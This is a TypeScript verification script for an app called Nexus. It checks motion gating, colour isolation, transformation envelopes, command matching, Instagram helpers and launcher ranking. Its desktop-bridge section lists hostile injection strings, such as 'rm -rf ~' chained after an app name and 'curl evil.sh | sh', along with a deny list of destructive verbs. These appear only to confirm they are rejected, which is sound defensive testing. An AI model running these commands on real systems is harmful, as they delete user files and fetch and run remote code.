/**
 * VERIFICATIONS.
 *
 * Three claims in this codebase are easy to assert and hard to keep true, so
 * they are checked rather than asserted:
 *
 *   1. Zero input produces EXACTLY zero drift — not "a small amount".
 *   2. A warned card can never go gold, at any degree of centredness.
 *   3. An injected command string resolves to "no such application" rather
 *      than executing.
 *
 * Run with: npm run verify
 */
import assert from 'node:assert/strict';
import { goldTerm, GOLD, WARNING, ACCENTS } from '../src/core/constants/palette.ts';
import { backAccumulate, detectFlavour } from '../src/server/data/instagram.ts';
import { rank } from '../src/components/launcher/rank.ts';
import { envelopesFor } from '../src/stores/useTransformStore.ts';
import { matchCommand } from '../src/ai/commands.ts';
import { VERBS, isVerb } from '../src/server/bridge/verbs.ts';

let failures = 0;
function check(name: string, fn: () => void) {
  try {
    fn();
    console.log(`  ok   ${name}`);
  } catch (err) {
    failures++;
    console.log(`  FAIL ${name}`);
    console.log(`       ${err instanceof Error ? err.message : err}`);
  }
}

console.log('\nMOTION GATING — zero input, zero drift');

check('a zero multiplier contributes exactly zero to the carousel angle', () => {
  // This mirrors Carousel.tsx exactly: the term is SKIPPED, not scaled.
  const driftFor = (m: number, t: number) => (m === 0 ? 0 : Math.sin(t * 0.00007) * 0.00022 * m);
  let angle = 1.2345678;
  const start = angle;
  for (let frame = 0; frame < 600; frame++) {
    angle += driftFor(0, frame * 16.67);
  }
  assert.equal(angle, start, 'angle changed with the gate closed');
  // And the same loop with the gate open must actually move, or the test is
  // proving nothing.
  let open = start;
  for (let frame = 0; frame < 600; frame++) open += driftFor(1, frame * 16.67 * 1000);
  assert.notEqual(open, start, 'gate open produced no drift either — test is vacuous');
});

check('a zero multiplier contributes exactly zero to the camera transform', () => {
  // Mirrors Rig.tsx: every ambient term is inside `if (m !== 0)`.
  const sample = (m: number, time: number) => {
    let dx = 0;
    let dy = 0;
    let dz = 0;
    if (m !== 0) {
      dx = Math.sin(time * 0.17) * 0.16 * m;
      dy = Math.sin(time * 0.13 + 1.7) * 0.09 * m;
      dz = Math.sin(time * 0.09 + 0.4) * 0.11 * m;
    }
    return [dx, dy, dz];
  };
  for (let t = 0; t < 10; t += 0.0166) {
    const [dx, dy, dz] = sample(0, t);
    assert.equal(dx, 0);
    assert.equal(dy, 0);
    assert.equal(dz, 0);
  }
});

console.log('\nGOLD — alert isolation');

check('gold and warning orange are 18 degrees apart', () => {
  // Stated so the next person does not "fix" the hues by moving them further
  // apart and conclude the isolation problem is solved.
  assert.equal(GOLD.h - WARNING.h, 18);
});

check('a warned card is never gold, at any centredness', () => {
  for (let c = 0; c <= 1.0001; c += 0.001) {
    assert.equal(goldTerm(c, true), 0, `warned card went gold at centredness ${c}`);
  }
  // Dead centre and unwarned must be fully gold, or the gate is just "off".
  assert.equal(goldTerm(1, false), 1);
});

check('gold is earned continuously — no threshold', () => {
  let previous = -1;
  for (let c = 0; c <= 1; c += 0.01) {
    const g = goldTerm(c, false);
    assert.ok(g >= previous, 'gold is not monotonic in centredness');
    previous = g;
  }
  // A power curve, so a merely adjacent card gets almost none.
  assert.ok(goldTerm(0.5, false) < 0.1, 'gold at half-centre is not steep enough');
});

check('every module accent is distinguishable in hue', () => {
  const hues = Object.values(ACCENTS).map((a) => a.h).sort((a, b) => a - b);
  for (let i = 1; i < hues.length; i++) {
    assert.ok(hues[i] - hues[i - 1] >= 14, `accents ${hues[i - 1]} and ${hues[i]} are too close`);
  }
  // And the spectrum spans violet to cyan rather than clustering on one blue.
  assert.ok(hues[hues.length - 1] - hues[0] >= 90, 'accent spectrum is too narrow');
});

console.log('\nTRANSFORMATION CLOCK');

check('envelopes are bounded and the journey is monotonic', () => {
  let previous = -1;
  for (let t = 0; t <= 1.0001; t += 0.005) {
    const e = envelopesFor(t);
    for (const [name, value] of Object.entries(e)) {
      assert.ok(Number.isFinite(value), `${name} is not finite at t=${t}`);
      assert.ok(value >= -1e-6 && value <= 1 + 1e-6, `${name} out of range at t=${t}: ${value}`);
    }
    assert.ok(e.journey >= previous);
    previous = e.journey;
  }
});

check('the figure is fully formed at the end and absent at the start', () => {
  assert.equal(envelopesFor(0).body, 0);
  assert.equal(envelopesFor(0).presence, 0);
  assert.ok(envelopesFor(1).body > 0.999);
  assert.ok(envelopesFor(1).eyes > 0.999);
  // The core is a window: it must be gone by the time the body is there.
  assert.ok(envelopesFor(1).core < 0.001, 'the core outlived the body');
});

console.log('\nCOMMAND ENGINE');

check('both transform phrasings match locally', () => {
  assert.deepEqual(matchCommand('Nexus, transform into a human shape'), {
    kind: 'transform',
    to: 'human',
  });
  assert.deepEqual(matchCommand('return to spatial mode'), { kind: 'transform', to: 'spatial' });
});

check('module and ring commands match', () => {
  assert.deepEqual(matchCommand('open stocks'), { kind: 'open', module: 'stocks' });
  assert.deepEqual(matchCommand('show my reels'), { kind: 'open', module: 'instagram' });
  assert.deepEqual(matchCommand('rotate left'), { kind: 'rotate', direction: -1 });
});

check('an open question is not mistaken for a command', () => {
  assert.equal(matchCommand('How is Nvidia today?').kind, 'ask');
  assert.equal(matchCommand('Explain MCP').kind, 'ask');
});

console.log('\nDESKTOP BRIDGE — injection');

check('an injected command string is not a verb', () => {
  for (const hostile of [
    'launch_app; rm -rf ~',
    '$(curl evil.sh)',
    '../../../bin/sh',
    'launch_app && shutdown -h now',
  ]) {
    assert.equal(isVerb(hostile), false, `"${hostile}" was accepted as a verb`);
  }
  assert.equal(isVerb('launch_app'), true);
});

check('destructive verbs do not exist in the enum', () => {
  for (const forbidden of ['shutdown', 'restart', 'delete_file', 'rm', 'exec', 'run_command']) {
    assert.ok(!(VERBS as readonly string[]).includes(forbidden), `${forbidden} is reachable`);
  }
});

check('an injected app name resolves to no application', async () => {
  // resolveApp scans the real disk. On a non-macOS box the roots are absent and
  // the scan is empty, which is still the correct outcome: nothing resolves.
  const { resolveApp } = await import('../src/server/bridge/apps.ts');
  for (const hostile of [
    'Safari; rm -rf ~',
    '`whoami`',
    '$(open -a Calculator)',
    'Terminal && curl evil.sh | sh',
  ]) {
    const resolved = await resolveApp(hostile);
    assert.equal(resolved, null, `"${hostile}" resolved to ${resolved?.name}`);
  }
});

console.log('\nINSTAGRAM');

check('token prefixes select the right API', () => {
  assert.equal(detectFlavour('IGAAxxxxxxxx'), 'instagram-login');
  assert.equal(detectFlavour('EAAxxxxxxxxx'), 'facebook-login');
  assert.equal(detectFlavour('random'), 'none');
  assert.equal(detectFlavour(undefined), 'none');
});

check('follower deltas back-accumulate into the true curve', () => {
  // The endpoint returns DAILY GAINS. Plotting them raw shows a flat line near
  // zero; the real curve is reconstructed backwards from the known total.
  const deltas = [10, 20, 30];
  const series = backAccumulate(1000, deltas);
  assert.deepEqual(series, [940, 950, 970, 1000]);
  assert.equal(series[series.length - 1], 1000, 'the curve must end at the known total');
});

console.log('\n⌘K RANKING');

check('the ladder is ordinal: prefix beats initials beats boundary beats substring', () => {
  const items = [
    { id: '1', label: 'Xcode', source: 'app' as const },
    { id: '2', label: 'Visual Studio Code', source: 'app' as const },
    { id: '3', label: 'Code Runner', source: 'app' as const },
  ];
  // "code" — a word-boundary match must beat a mid-word substring match.
  const byCode = rank(items, 'code');
  assert.equal(byCode[0].label, 'Code Runner', 'prefix match did not win');
  assert.ok(
    byCode.findIndex((i) => i.label === 'Visual Studio Code') <
      byCode.findIndex((i) => i.label === 'Xcode'),
    'mid-word substring outranked a word-boundary match',
  );
  // Initials.
  assert.equal(rank(items, 'vsc')[0].label, 'Visual Studio Code');
});

const run = async () => {
  // The async check above needs to settle before the summary.
  await new Promise((r) => setTimeout(r, 300));
  console.log(
    failures === 0 ? '\nAll verifications passed.\n' : `\n${failures} verification(s) failed.\n`,
  );
  process.exit(failures === 0 ? 0 : 1);
};
void run();
